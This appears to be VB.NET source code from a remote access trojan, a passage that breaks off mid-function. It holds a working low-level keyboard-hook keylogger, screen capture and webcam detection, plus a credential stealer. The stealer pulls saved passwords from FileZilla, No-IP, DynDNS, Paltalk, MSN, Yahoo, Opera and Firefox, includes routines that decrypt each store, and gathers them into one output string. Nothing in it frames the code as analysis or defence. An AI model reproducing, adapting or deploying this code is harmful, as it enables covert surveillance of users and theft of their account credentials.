Imports System.IO, System.Management, System.Runtime.InteropServices
Imports System.Text
Imports System.Security.Cryptography
Imports System.ComponentModel
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Threading
Imports System.Net

Module _1
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function CaptureDesktop() As Image
        Try
            Dim bounds As Rectangle = Nothing
            Dim screenshot As System.Drawing.Bitmap = Nothing
            Dim graph As Graphics = Nothing
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Return screenshot
        Catch
            Return Nothing
        End Try
    End Function
    Function GetFirewall() As String
        Dim str As String = Nothing
        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
        Dim instances As ManagementObjectCollection = searcher.[Get]()
        For Each queryObj As ManagementObject In instances
            str = queryObj("displayName").ToString()
        Next
        Return str
        searcher.Dispose()
    End Function
    Public Enum GetWindowCmd As UInteger
        GW_HWNDFIRST = 0
        GW_HWNDLAST = 1
        GW_HWNDNEXT = 2
        GW_HWNDPREV = 3
        GW_OWNER = 4
        GW_CHILD = 5
        GW_ENABLEDPOPUP = 6
    End Enum
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function ShowWindow(ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Boolean
    End Function
    <DllImport("KERNEL32.DLL")> _
    Public Sub Beep(ByVal freq As Integer, ByVal dur As Integer)
    End Sub
    Public Function GetSystemRAMSize() As Double
        Try
            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
            Return FormatNumber(RAM_Size, 2)
        Catch ex As Exception
        End Try
    End Function
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
 ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
 ByVal cbVer As Integer) As Boolean
    Public Function checkcam() As String
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return "Yes"
                End If
            Next
        Catch ex As Exception
        End Try
        Return "No"
    End Function
    Public Class BlueLogger

        Public Logs As String = "" '<<<<<<<<<< you Read Logs By this 
        Public isRunning As Boolean = False
        Public MaxLength As Integer = 100 * 1024 ' Max Logs Size 100KB
        Private Stream As IO.StreamWriter
        Dim o = My.Computer.Clock.LocalTime

        Public LogsPath As String = Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name & ".log"
        Public Sub Start()
            If isRunning = True Then Exit Sub
            Try
                Logs = IO.File.ReadAllText(LogsPath)
            Catch ex As Exception
            End Try
            Stream = IO.File.AppendText(LogsPath)
            Stream.AutoFlush = True
            HHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KBDLLHookProcDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
            Dim t As New Threading.Thread(AddressOf WRK, 1)
            t.Start()
        End Sub
        Private OFF As Boolean = False
        Public Sub Close(ByVal DeleteLogs As Boolean)
            OFF = True
            Do Until isRunning = False
                Threading.Thread.CurrentThread.Sleep(1)
            Loop
            If DeleteLogs = True Then
                Threading.Thread.CurrentThread.Sleep(1000)
                Try
                    IO.File.Delete(LogsPath)
                Catch ex As Exception
                End Try
                Logs = ""
            End If
            OFF = False
        End Sub
        Private LastAV As Integer ' Last Active Window Handle
        Private LastAS As String ' Last Active Window Title
        Private lastKey As Keys = Nothing
        Private Function AV() As String ' Get Active Window
            Try
                Dim o = GetForegroundWindow
                Dim id As Integer
                GetWindowThreadProcessId(o, id)
                Dim p As Process = Process.GetProcessById(id)
                If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Then
                    Return ""
                Else
                    LastAV = o.ToInt32
                    LastAS = p.MainWindowTitle
                    Return vbNewLine & vbNewLine & "[" & LastAS & "]" & HM() & vbNewLine
                End If
            Catch ex As Exception
                Return ""
            End Try
        End Function
        Private Function HM() As String
            Dim oo = My.Computer.Clock.LocalTime
            Return " " & oo.Day & "\" & oo.Month & "\" & oo.Year
        End Function
        Private Sub WRK()
            isRunning = True
            Try
                Do Until OFF = True
                    Threading.Thread.CurrentThread.Sleep(1)
                    For i As Integer = 0 To Isdown.Length - 1
                        If Isdown(i) Then
                            Isdown(i) = False
                            Dim s As String = AV() & Fix(i)
                            lastKey = i
                            Logs += s
                            Stream.Write(s)
                            If Logs.Length > MaxLength Then
                                Logs = Logs.Remove(0, Logs.Length - MaxLength)
                                Stream.Close()
                                Stream.Dispose()
                                IO.File.WriteAllText(LogsPath, Logs)
                                Stream = IO.File.AppendText(LogsPath)
                                Stream.AutoFlush = True
                            End If
                        End If
                    Next
                Loop
            Catch ex As Exception
            End Try
            Try
                Stream.Close()
            Catch ex As Exception
            End Try
            Try
                Stream.Dispose()
            Catch ex As Exception
            End Try
            isRunning = False
        End Sub
#Region "API"
        <DllImport("user32.dll")> _
        Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, _
  ByVal dwhkl As IntPtr) As Integer
        End Function
        <DllImport("user32.dll")> _
        Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
        End Function
        <DllImport("user32.dll")> _
        Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
        End Function
        <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
        Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
        End Function
        <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
        Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        End Function
        <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
        Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
        End Function
        Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
        Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
        Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
#End Region
        Private Isdown(255) As Boolean
        Private Function Fix(ByVal k As Keys) As String
            Dim isuper As Boolean = My.Computer.Keyboard.ShiftKeyDown
            If My.Computer.Keyboard.CapsLock = True Then
                If isuper = True Then
                    isuper = False
                Else
                    isuper = True
                End If
            End If
            Try
                Select Case k
                    Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                        Return "[" & k.ToString & "]"
                    Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                        Return ""
                    Case Keys.Space
                        Return " "
                    Case Keys.Enter, Keys.Return
                        If lastKey = k Then Return ""
                        Return "[ENTER]" & vbNewLine
                    Case Keys.Tab
                        If lastKey = k Then Return ""
                        Return "[TAP]" & vbNewLine
                    Case Else
                        If isuper = True Then
                            Return VKCodeToUnicode(k).ToUpper
                        Else
                            Return VKCodeToUnicode(k)
                        End If
                End Select
            Catch ex As Exception
                If isuper = True Then
                    Return ChrW(k).ToString.ToUpper
                Else
                    Return ChrW(k).ToString.ToLower
                End If
            End Try
        End Function
        Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
            Try
                Dim sbString As New System.Text.StringBuilder()
                Dim bKeyState As Byte() = New Byte(254) {}
                Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
                If Not bKeyStateStatus Then
                    Return ""
                End If
                Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
                Dim h As IntPtr = GetForegroundWindow()
                Dim id As Integer = 0
                Dim Aid As Integer = GetWindowThreadProcessId(h, id)
                Dim HKL As IntPtr = GetKeyboardLayout(Aid)
                ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
                 HKL)
                Return sbString.ToString()
            Catch ex As Exception
            End Try
            Return CType(VKCode, Keys).ToString
        End Function
#Region "KeyHook"
        <StructLayout(LayoutKind.Sequential)> _
        Private Structure KBDLLHOOKSTRUCT
            Public vkCode As UInt32
            Public scanCode As UInt32
            Public flags As KBDLLHOOKSTRUCTFlags
            Public time As UInt32
            Public dwExtraInfo As UIntPtr
        End Structure
        <Flags()> _
        Private Enum KBDLLHOOKSTRUCTFlags As UInt32
            LLKHF_EXTENDED = &H1
            LLKHF_INJECTED = &H10
            LLKHF_ALTDOWN = &H20
            LLKHF_UP = &H80
        End Enum
        Private Const WH_KEYBOARD_LL As Integer = 13
        Private Const HC_ACTION As Integer = 0
        Private Const WM_SYSKEYDOWN = &H104
        Private Const WM_SYSKEYUP = &H105
        Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
        Private HHookID As IntPtr = IntPtr.Zero
        Private Const WM_KEYDOWN = &H100
        Private Const WM_KEYUP = &H101
        Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
            If (nCode = HC_ACTION) Then
                Dim struct As KBDLLHOOKSTRUCT
                Select Case wParam
                    Case WM_KEYDOWN, WM_SYSKEYDOWN
                        Dim k = (CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                        Isdown(k) = True
                    Case WM_KEYUP, WM_SYSKEYUP
                        Dim k = (CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                        Isdown(k) = False
                End Select
            End If
            Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
        End Function
#End Region
    End Class
    Public Function ACT() As String
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Public Enum ThreadAccess As Integer
        TERMINATE = (&H1)
        SUSPEND_RESUME = (&H2)
        GET_CONTEXT = (&H8)
        SET_CONTEXT = (&H10)
        SET_INFORMATION = (&H20)
        QUERY_INFORMATION = (&H40)
        SET_THREAD_TOKEN = (&H80)
        IMPERSONATE = (&H100)
        DIRECT_IMPERSONATION = (&H200)
    End Enum
    Public Declare Function OpenThread Lib "kernel32.dll" (ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInteger) As IntPtr
    Public Declare Function SuspendThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function CloseHandle Lib "kernel32.dll" (ByVal hHandle As IntPtr) As Boolean
End Module
Public Class A
    Public Shared Function GT() As String
        OL = ""
        P1()
        P2()
        dyn()
        paltalk()
        GetFire()
        Chrome.Gchrome()
        Msn()
        Yahoo()
        GetOpera()
        Dim r = New CIE7Passwords
        r.Refresh()
        Return OL
    End Function
End Class
Module p

    Public Sub Yahoo()
        Try

            For Each k As String In Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Yahoo\Profiles").GetSubKeyNames
                OL += "|URL| http://Yahoo.com" & vbNewLine & "|USR| " & k & vbNewLine & "|PWD| " & vbNewLine
            Next
        Catch ex As Exception
        End Try
    End Sub
    Public OL As String

#Region "MSN Password"
    <DllImport("advapi32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)> _
    Public Function CredEnumerateW(ByVal filter As String, ByVal flag As UInt32, <Out()> ByRef count As UInt32, <Out()> ByRef pCredentials As IntPtr) As Boolean
    End Function
    <StructLayout(LayoutKind.Sequential)> _
    Friend Structure CREDENTIAL
        Public Flags As Integer
        Public Type As Integer
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetName As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public Comment As String
        Public LastWritten As Long
        Public CredentialBlobSize As Integer
        Public CredentialBlob As IntPtr
        Public Persist As Integer
        Public AttributeCount As Integer
        Public Attributes As IntPtr
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public TargetAlias As String
        <MarshalAs(UnmanagedType.LPWStr)> _
        Public UserName As String
    End Structure
    Sub Msn()

        Try
            Dim num As UInt32
            Dim zero As IntPtr = IntPtr.Zero
            If CredEnumerateW(("WindowsLive:name=" & "*"), 0, num, zero) Then
                Dim i As Integer
                For i = 0 To num - 1
                    Try
                        Dim s As String
                        OL += "|URL| http://hotmail.com" & vbNewLine
                        Dim credential As CREDENTIAL = DirectCast(Marshal.PtrToStructure(Marshal.ReadIntPtr(zero, (IntPtr.Size * i)), GetType(CREDENTIAL)), CREDENTIAL)
                        OL += "|USR| " & credential.UserName & vbNewLine
                        Try
                            OL += "|PWD| " & Marshal.PtrToStringBSTR(credential.CredentialBlob) & vbNewLine

                        Catch ex As Exception
                            OL += "|PWD| " & vbNewLine
                        End Try
                    Catch ex As Exception
                    End Try
                Next i
            End If
        Catch ex As Exception
        End Try
    End Sub
#End Region
    Sub P1()
        Try

            Dim O As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")


            For Each u As String In O
                Dim UU = Split(u, vbNewLine)
                For Each I As String In UU
                    If I.Contains("<Host>") Then
                        OL += "|URL| " & Split(Split(I, "<Host>")(1), "</Host>")(0) & vbNewLine
                    End If
                    If I.Contains("<User>") Then
                        OL += "|USR| " & Split(Split(I, "<User>")(1), "</User>")(0) & vbNewLine
                    End If
                    If I.Contains("<Pass>") Then
                        OL += "|PWD| " & Split(Split(I, "<Pass>")(1), "</Pass>")(0) & vbNewLine
                    End If
                Next
            Next
        Catch ex As Exception

        End Try

    End Sub
    Sub P2()
        Try

            Dim s As String = "HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC"
            Dim U As String = Microsoft.Win32.Registry.GetValue(s, "USERname", "")
            Dim P As String = Microsoft.Win32.Registry.GetValue(s, "Password", "")
            If U = "" Then Exit Sub
            OL += "|URL| http://no-ip.com" & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & vbNewLine
        Catch c As Exception
        End Try
    End Sub
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Sub paltalk()
        Try

            Dim ser() As Char = HWD.ToCharArray
            Dim reg As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim out As String = ""
            reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Paltalk")
            Dim users As String() = reg.GetSubKeyNames()
            reg.Close()
            For Each s As String In users
                Dim t, o, i, x As Integer
                Dim pass As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\Software\Paltalk\" & s, "pwd", "")
                Dim chr1 As Char() = pass.ToCharArray
                Dim passarr(pass.Length / 4) As String
                While t <= UBound(chr1) - 4
                    If t < UBound(chr1) - 4 Then
                        passarr(o) = chr1(t) & chr1(t + 1) & chr1(t + 2)
                    End If
                    t += 4
                    o += 1
                End While
                Dim key As String = ""
                For Each c As Char In s
                    key += c
                    If i <= UBound(ser) Then
                        key += ser(i)
                    End If
                    i = i + 1
                Next
                key = key & key & key
                Dim chr_arr As Char() = key.ToCharArray
                Dim blainpass As String = ""
                blainpass += Chr(passarr(0) - 122 - Asc(key.Substring(key.Length - 1, 1)))
                For x = 1 To UBound(passarr)
                    Dim tempchr As Char
                    If passarr(x) Is Nothing Then
                    Else
                        tempchr = Chr(passarr(x) - x - Asc(chr_arr(x - 1)) - 122)
                        blainpass += tempchr
                    End If
                Next x
                OL += "|URL| http://Paltalk.com" & vbNewLine & "|USR| " & s & vbNewLine & "|PWD| " & blainpass & vbNewLine

            Next
        Catch ex As Exception
        End Try
    End Sub
    Sub dyn()

        Try

            Dim p = Replace(Environ("ALLUSERSPROFILE") & "\", "\\", "\")
            Dim pp = p & "DynDNS\Updater\config.dyndns"
            Dim usr As String
            Dim ps As String
            Dim pas As String
            Dim ii As Integer
            If IO.File.Exists(pp) = True Then
                Dim A As Array = IO.File.ReadAllLines(pp)
                For Each s As String In A
                    If InStr(s.ToLower, "username=") > 0 Then
                        usr = Split(s, "=")(1)
                    End If
                    If InStr(s.ToLower, "password=") > 0 Then
                        ps = Split(s, "=")(1)
                        For i = 1 To Len(ps) Step 2
                            pas = pas & Chr(Val("&H" & Mid(ps, i, 2)))
                        Next i
                        For i = 1 To Len(pas)
                            Mid(pas, i, 1) = Chr((Asc(Mid(pas, i, 1))) Xor (Asc(Mid("t6KzXhCh", ii + 1, 1))))
                            ii = ((ii + 1) Mod 8)
                        Next i
                        If usr.Length = 0 Then Exit Sub
                        OL += "|URL| http://DynDns.com" & vbNewLine & "|USR| " & usr & vbNewLine & "|PWD| " & pas & vbNewLine

                        Exit Sub
                    End If
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
#Region "Opera"
    Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3, _
    &HE8, &H69, &H73, &HAF, &HFF}
    Private key_size As Byte() = {&H0, &H0, &H0, &H8}
    Private path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public DOutput As String
    Public Sub GetOpera()
        '  OL += vbNewLine & "###Opera" & vbNewLine
        If File.Exists(path & "\Opera\Opera\wand.dat") Then
            path += "\Opera\Opera\wand.dat"
        Else
            If File.Exists(path & "\Opera\Opera\profile\wand.dat") Then
                path += "\Opera\Opera\profile\wand.dat"
            End If
        End If
        Dim Q As String = ""

        Try
            Dim wand_file As Byte() = File.ReadAllBytes(path)
            Dim block_size As Integer = 0
            For i As Integer = 0 To wand_file.Length - 5
                If wand_file(i) = &H0 AndAlso wand_file(i + 1) = &H0 AndAlso wand_file(i + 2) = &H0 AndAlso wand_file(i + 3) = &H8 Then
                    block_size = CInt(wand_file(i + 15))
                    Dim key As Byte() = New Byte(7) {}
                    Dim encrypt_data As Byte() = New Byte(block_size - 1) {}
                    Array.Copy(wand_file, i + 4, key, 0, key.Length)
                    Array.Copy(wand_file, i + 16, encrypt_data, 0, encrypt_data.Length)
                    DOutput += decrypt2_method(key, encrypt_data) & vbNewLine
                    i += 11 + block_size
                End If
            Next
            Dim A As String() = Split(DOutput, vbNewLine)
            For i As Integer = 0 To A.Length - 1
                Dim w As String = FL(A(i))
                Dim url As String = ""
                Dim U As String = ""
                Dim P As String = ""
                If w.ToLower.StartsWith("http://") Or w.ToLower.StartsWith("https://") Then
                    url = w
                    If i + 2 < A.Length Then
                        For ii As Integer = i + 1 To i + 2
                            Dim xx As String = A(ii)
                            If xx.ToLower.StartsWith("http://") Or xx.ToLower.StartsWith("https://") Then
                                Exit For
                            End If
                            If ii = i + 2 Then
                                U = FL(xx)
                            End If
                        Next
                    End If
                    If i + 4 < A.Length Then
                        For ii As Integer = i + 1 To i + 4
                            Dim xx As String = A(ii)
                            If xx.ToLower.StartsWith("http://") Or xx.ToLower.StartsWith("https://") Then
                                Exit For
                            End If
                            If ii = i + 4 Then
                                P = FL(xx)
                            End If
                        Next
                    End If
                    OL += "|URL| " & url & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & vbNewLine

                End If
            Next
        Catch ex As Exception
        End Try
    End Sub
    Function FL(ByVal s As String) As String
        Dim f As String = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+="
        Dim w As String = ""
        For Each xx As String In s
            If f.Contains(xx.ToLower) Then
                w &= xx
            End If
        Next
        Return w
    End Function
    Public Function decrypt2_method(ByVal key As Byte(), ByVal encrypt_data As Byte())
        Try
            Dim md5Crypt As New MD5CryptoServiceProvider()
            md5Crypt.Initialize()
            Dim tmpBuffer As Byte() = New Byte(opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(opera_salt, tmpBuffer, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, opera_salt.Length, key.Length)
            Dim hash1 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
            tmpBuffer = New Byte(hash1.Length + opera_salt.Length + (key.Length - 1)) {}
            Array.Copy(hash1, tmpBuffer, hash1.Length)
            Array.Copy(opera_salt, 0, tmpBuffer, hash1.Length, opera_salt.Length)
            Array.Copy(key, 0, tmpBuffer, hash1.Length + opera_salt.Length, key.Length)
            Dim hash2 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
            Dim tripleDES As New TripleDESCryptoServiceProvider()
            tripleDES.Mode = CipherMode.CBC
            tripleDES.Padding = PaddingMode.None
            Dim tripleKey As Byte() = New Byte(23) {}
            Dim IV As Byte() = New Byte(7) {}
            Array.Copy(hash1, tripleKey, hash1.Length)
            Array.Copy(hash2, 0, tripleKey, hash1.Length, 8)
            Array.Copy(hash2, 8, IV, 0, 8)
            tripleDES.Key = tripleKey
            tripleDES.IV = IV
            Dim decryter As ICryptoTransform = tripleDES.CreateDecryptor()
            Dim output As Byte() = decryter.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length)
            Dim enc As String = Encoding.Unicode.GetString(output)
            Return enc
        Catch e As Exception
            Return ""
        End Try
    End Function
#End Region
End Module
#Region "FireFox"
Module firefox5
    Public Function GetFire() As String
        '  OL += vbNewLine & "###FireFox" & vbNewLine
        Try
            Dim FoundFile As Boolean = False
            Dim KeySlot As Long = 0
            Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
            Dim DefaultPath As String = Environment.GetEnvironmentVariable("APPDATA") & "\Mozilla\Firefox\Profiles"
            Dim Dirs As String() = IO.Directory.GetDirectories(DefaultPath)
            For Each dir As String In Dirs
                If Not FoundFile Then
                    Dim Files As String() = IO.Directory.GetFiles(dir)
                    For Each CurrFile As String In Files
                        If Not FoundFile Then
                            If System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite") Then
                                NSS_Init(dir)
                                signon = CurrFile
                            End If
                        Else

                            Exit For
                        End If
                    Next
                Else
                    Exit For
                End If
            Next

            Dim dataSource As String = signon
            Dim tSec As New TSECItem()
            Dim tSecDec As New TSECItem()
            Dim tSecDec2 As New TSECItem()
            Dim bvRet As Byte()
            Dim db As New SQLiteBase5(dataSource)

            Dim table As System.Data.DataTable = db.ExecuteQuery("SELECT * FROM moz_logins;")
            Dim table2 As System.Data.DataTable = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;")
            For Each row As System.Data.DataRow In table2.Rows
            Next
            KeySlot = PK11_GetInternalKeySlot()
            PK11_Authenticate(KeySlot, True, 0)

            For Each Zeile As System.Data.DataRow In table.Rows
                Dim formurl As String = System.Convert.ToString(Zeile("formSubmitURL").ToString())
                Dim url As String = formurl
                Dim usr As String = ""
                Dim pw As String = ""
                Dim se As New StringBuilder(Zeile("encryptedUsername").ToString())
                Dim hi2 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length)
                Dim item As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi2), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item, tSecDec, 0) = 0 Then
                    If tSecDec.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen)
                        usr = System.Text.Encoding.UTF8.GetString(bvRet)
                    End If
                End If
                Dim se2 As New StringBuilder(Zeile("encryptedPassword").ToString())
                Dim hi22 As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length)
                Dim item2 As TSECItem = DirectCast(Marshal.PtrToStructure(New IntPtr(hi22), GetType(TSECItem)), TSECItem)
                If PK11SDR_Decrypt(item2, tSecDec2, 0) = 0 Then
                    If tSecDec2.SECItemLen <> 0 Then
                        bvRet = New Byte(tSecDec2.SECItemLen - 1) {}
                        Marshal.Copy(New IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen)
                        pw = System.Text.Encoding.UTF8.GetString(bvRet)
                    End If
                End If
                OL += "|URL| " & url & vbNewLine & "|USR| " & usr & vbNewLine & "|PWD| " & pw & vbNewLine

            Next
        Catch ex As Exception
        End Try
    End Function
    Public Class SHITEMID
        Public Shared cb As Long
        Public Shared abID As Byte()
    End Class
    <StructLayout(LayoutKind.Sequential)> _
    Public Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As Integer
        Public SECItemLen As Integer
    End Structure

    <DllImport("kernel32.dll")> _
    Private Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function
    Private NSS3 As IntPtr
    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)> _
    Private Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    Public Function NSS_Init(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        LoadLibrary(MozillaPath & "mozutils.dll") 'DODANO
        LoadLibrary(MozillaPath & "mozglue.dll")
        LoadLibrary(MozillaPath & "mozcrt19.dll")
        LoadLibrary(MozillaPath & "nspr4.dll")
        LoadLibrary(MozillaPath & "plc4.dll")
        LoadLibrary(MozillaPath & "plds4.dll")
